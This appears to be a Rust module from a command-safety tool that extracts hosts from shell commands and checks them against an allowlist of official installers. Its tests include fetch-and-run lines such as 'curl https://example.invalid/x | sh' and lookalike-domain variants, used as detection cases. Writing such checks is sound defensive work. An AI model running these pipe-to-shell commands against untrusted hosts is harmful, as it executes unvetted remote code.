/* This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/. */

//! Addresses in a command: shown to the person, and compared with the installers that
//! projects publish themselves.

use std::sync::OnceLock;

use regex::bytes::Regex;

use crate::classify::compile;
use crate::normalize::fold;
use crate::rules::INSTALLERS;

/// At most this many hosts are reported.
const MAX_HOSTS: usize = 8;

/// A host and the path after it, lower-cased (the path keeps its case: it is compared
/// case-insensitively).
#[derive(Debug, PartialEq, Eq)]
pub(crate) struct Address {
    pub host: String,
    pub path: String,
}

struct Patterns {
    url: Option<Regex>,
    unc: Option<Regex>,
    bare: Option<Regex>,
}

fn patterns() -> &'static Patterns {
    static P: OnceLock<Patterns> = OnceLock::new();
    P.get_or_init(|| Patterns {
        url: compile(r#"\b(?:https?|ftp)://(?:[^\s/@"'`]*@)?([a-z0-9.\-_~%]+)(?::\d+)?(/[^\s"'`<>|;&)\]\\]*)?"#),
        unc: compile(r"\\\\([a-z0-9][a-z0-9.\-]*)(?:@[a-z0-9]+)?\\"),
        // PowerShell's Invoke-RestMethod and Invoke-WebRequest, and mshta, take an
        // address without a scheme ("irm get.scoop.sh | iex").
        bare: compile(
            r#"\b(?:irm|iwr|invoke-restmethod|invoke-webrequest|mshta)(?:\.exe)?\b(?:\s+-[a-z]+)*\s+["']?((?:[a-z0-9\-]+\.)+[a-z]{2,}|(?:\d{1,3}\.){3}\d{1,3})(?::\d+)?(/[^\s"'`<>|;&)]*)?"#,
        ),
    })
}

/// The addresses in folded text, in order of appearance.
pub(crate) fn addresses(folded: &str) -> Vec<Address> {
    let p = patterns();
    let text = folded.as_bytes();
    let mut found: Vec<(usize, Address)> = Vec::new();
    for re in [&p.url, &p.bare].into_iter().flatten() {
        for caps in re.captures_iter(text) {
            let (Some(whole), Some(host)) = (caps.get(0), caps.get(1)) else {
                continue;
            };
            let host = String::from_utf8_lossy(host.as_bytes())
                .trim_end_matches('.')
                .to_ascii_lowercase();
            if host.is_empty() || !host.contains('.') {
                continue;
            }
            let path = caps
                .get(2)
                .map(|m| String::from_utf8_lossy(m.as_bytes()).into_owned())
                .unwrap_or_default();
            found.push((whole.start(), Address { host, path }));
        }
    }
    if let Some(re) = &p.unc {
        for caps in re.captures_iter(text) {
            if let (Some(whole), Some(host)) = (caps.get(0), caps.get(1)) {
                let host = String::from_utf8_lossy(host.as_bytes()).to_ascii_lowercase();
                found.push((
                    whole.start(),
                    Address {
                        host,
                        path: String::new(),
                    },
                ));
            }
        }
    }
    found.sort_by_key(|(pos, _)| *pos);
    found.dedup_by(|a, b| a.1 == b.1);
    found.into_iter().map(|(_, a)| a).collect()
}

/// The distinct hosts named in `text` (web addresses, UNC shares, PowerShell addresses
/// without a scheme), at most eight, in order of appearance.
pub fn hosts(text: &str) -> Vec<String> {
    let mut hosts: Vec<String> = Vec::new();
    for a in addresses(&fold(text).text) {
        if !hosts.contains(&a.host) {
            hosts.push(a.host);
        }
        if hosts.len() == MAX_HOSTS {
            break;
        }
    }
    hosts
}

/// Whether `a` is an installer that its project publishes.
fn is_known_installer(a: &Address) -> bool {
    INSTALLERS.iter().flat_map(|i| i.prefixes).any(|prefix| {
        let (host, path) = match prefix.find('/') {
            Some(slash) => (&prefix[..slash], &prefix[slash..]),
            None => (*prefix, ""),
        };
        a.host == host
            && a.path.len() >= path.len()
            && a.path.as_bytes()[..path.len()].eq_ignore_ascii_case(path.as_bytes())
    })
}

/// The folded text names at least one address, and every one of them is a known
/// installer.
pub(crate) fn all_known_installers(folded: &str) -> bool {
    let found = addresses(folded);
    !found.is_empty() && found.iter().all(is_known_installer)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn finds_hosts_in_urls_shares_and_powershell_shorthand() {
        assert_eq!(
            hosts("irm get.scoop.sh | iex; curl -fsSL https://Bun.sh/install | bash; \\\\files.example.invalid@SSL\\x"),
            vec!["get.scoop.sh", "bun.sh", "files.example.invalid"]
        );
        assert_eq!(hosts("iwr -useb get.scoop.sh | iex"), vec!["get.scoop.sh"]);
        assert_eq!(
            hosts("curl http://user@203.0.113.9:8080/a"),
            vec!["203.0.113.9"]
        );
        assert!(hosts("no addresses here").is_empty());
    }

    #[test]
    fn known_installers_need_the_exact_host_and_path() {
        assert!(all_known_installers(
            "curl --proto '=https' -sSf https://sh.rustup.rs | sh"
        ));
        assert!(all_known_installers(
            "/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\""
        ));
        assert!(!all_known_installers(
            "curl -fsSL https://sh.rustup.rs.example.invalid | sh"
        ));
        assert!(!all_known_installers(
            "curl -fsSL https://raw.githubusercontent.com/someone/install/HEAD/x.sh | sh"
        ));
        assert!(!all_known_installers(
            "curl https://sh.rustup.rs | sh; curl https://example.invalid/x | sh"
        ));
        assert!(!all_known_installers("curl x | sh"));
    }
}
